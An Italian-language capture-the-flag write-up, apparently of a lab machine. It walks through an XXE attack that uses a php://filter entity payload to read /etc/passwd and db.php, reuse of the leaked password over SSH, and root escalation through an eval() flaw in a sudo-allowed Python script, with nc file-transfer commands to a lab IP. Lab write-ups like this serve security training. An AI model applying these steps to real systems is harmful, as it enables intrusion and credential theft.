@@ -1,0 +1,53 @@
+Due porte aperte. Un server Apache (sito) e una OpenSSH
+Andiamo sul sito
+
+Il sito è all'apparenza normale, nulla di nuovo neanche nell'inspect page
+Se vado sul portale ed accedo al link pero' posso raggiungere la pagina di log_submit che serve per inserire le info in un Bounty tracker
+
+All'interno del source code ci sono due resources nel bountylog vedo che viene fatta una submit ad un url
+tracker_diRbPr00f314.php. Giusto tenerne conto in quanto è un url di tipo dirbproof, non sarei in grado di rilevarlo con dirbuster o gobuster
+
+Il form del Bounty Report system riscrive i dati. Questo mi fa subito bensare ad un attacco di tipo XXE reflection mode
+
+Con burpsuite vedo che infatti manda i dati inseriti nel report system all'url di prima, prima di averli encoded ovviamente
+
+Andando ad inserire il payload nella richiesta tramite burpsuite (sia base64 encoded che sucessivamente URL encoded) posso ricavare il contenuto del file /etc/psswd
+
+Devo capire che file leggere, quali sono quei file utili.
+Analizzo il gobuster, noto db.php con size 0. È interessante, non visualizzabile da browser ma tramite XXE
+
+Il nuovo payload è
+[ <!ENTITY xxe SYSTEM "php:///filter/convert.base64-encode/resource=/var/www/html/db.php"> ]>
+
+La conversione viene fatta in quella directory specifica in quanto so che quella è tipicamente la directory che corrisponde a root directory per i server Apache
+
+La risposta è ovviamente in base64, vado a decodificare e trovo una password
+Provo con ssh negli utenti che avevo trovato
+
+Sono dentro a development. user flag trovata
+Ora priviledge escalation, come diventare root
+
+sudo -l per vedere che comandi posso fare da root
+Vedo che c'è ticket validator che è un comando eseguibile da root senza password
+
+Analizzo il codice per capire quale parte sia vulnerabile
+eval, alla linea 34 è vulnerabile visto che la funzione eval() permette di eseguire codice Python arbitrariamente
+
+Metterò all'interno una reverse shell
+Ho portato lo script in locale e creato un file .md apposito che mi permetta di andare fino alla eval senza errori
+
+Creo un file .md che invece di andare ad inserire un codice ticket corretto esegua del codice malevolo
+
+Ho creato il file md che mi permette di inviare una reverse shell. Devo ora inviarlo alla macchina per poterlo eseguire con lo script
+
+Lo invio tramite nc
+Dalla macchina locale 
+nc -lvnp 4231 < malware.md
+
+Da quella da remoto in tmp
+nc 10.10.14.10 4231 > malware.md
+
+Posso ora inviare il comando con sudo (so che non mi sarà chiesta password di root) inserendo il malware malevolo
+Sono diventato root
+
+Anche lo script bashmal è sufficiente in quanto chiama una bash da sudo quindi da root. Eseguendolo quindi la mia bash cambia e diventa root
